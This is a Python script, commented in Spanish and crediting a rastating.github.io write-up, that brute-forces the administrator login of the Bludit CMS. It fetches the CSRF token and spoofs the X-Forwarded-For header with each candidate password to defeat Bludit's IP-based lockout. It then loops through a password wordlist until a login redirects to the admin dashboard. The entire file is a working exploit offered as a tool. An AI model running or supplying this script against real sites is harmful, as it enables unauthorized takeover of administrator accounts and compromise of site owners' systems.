#!/usr/bin/env python3
# 
#Basado en el articulo: https://rastating.github.io/bludit-brute-force-mitigation-bypass/

import re
import requests
import argparse

print("")
print("$$$$$$$\\  $$\\                 $$\\ $$\\   $$\\     $$$$$$$\\                        $$\\               ")
print("$$  __$$\\ $$ |                $$ |\\__|  $$ |    $$  __$$\\                       $$ |              ")
print("$$ |  $$ |$$ |$$\\   $$\\  $$$$$$$ |$$\\ $$$$$$\\   $$ |  $$ | $$$$$$\\  $$\\   $$\\ $$$$$$\\    $$$$$$\\  ")
print("$$$$$$$\\ |$$ |$$ |  $$ |$$  __$$ |$$ |\\_$$  _|  $$$$$$$\\ |$$  __$$\\ $$ |  $$ |\\_$$  _|  $$  __$$\\ ")
print("$$  __$$\\ $$ |$$ |  $$ |$$ /  $$ |$$ |  $$ |    $$  __$$\\ $$ |  \\__|$$ |  $$ |  $$ |    $$$$$$$$ |")
print("$$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$\\ $$ |  $$ |$$ |      $$ |  $$ |  $$ |$$\\ $$   ____|")
print("$$$$$$$  |$$ |\\$$$$$$  |\\$$$$$$$ |$$ |  \\$$$$  |$$$$$$$  |$$ |      \\$$$$$$  |  \\$$$$  |\\$$$$$$$\\ ")
print("\\_______/ \\__| \\______/  \\_______|\\__|   \\____/ \\_______/ \\__|       \\______/    \\____/  \\_______|")
print("")
parser = argparse.ArgumentParser(description='Bludit bruteforce')
parser.add_argument('--url','-u',metavar='URL',required=True,
    help='url del panel de administracion')
parser.add_argument('--user','-U',metavar='USER',required=True,
    help='nombre de usuario valido')
parser.add_argument('--file','-F',metavar='FILE',required=True,
    help='lista de posibles passwords')
args = parser.parse_args()

login_url = args.url+'/'
username = args.user
file = args.file


# Agregando contenido al diccionario
my_file = open(file, "r")
content = my_file.read()
wordlist = content.split("\n")
my_file.close()

# Add the correct password to the end of the list
#wordlist.append('adminadmin')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break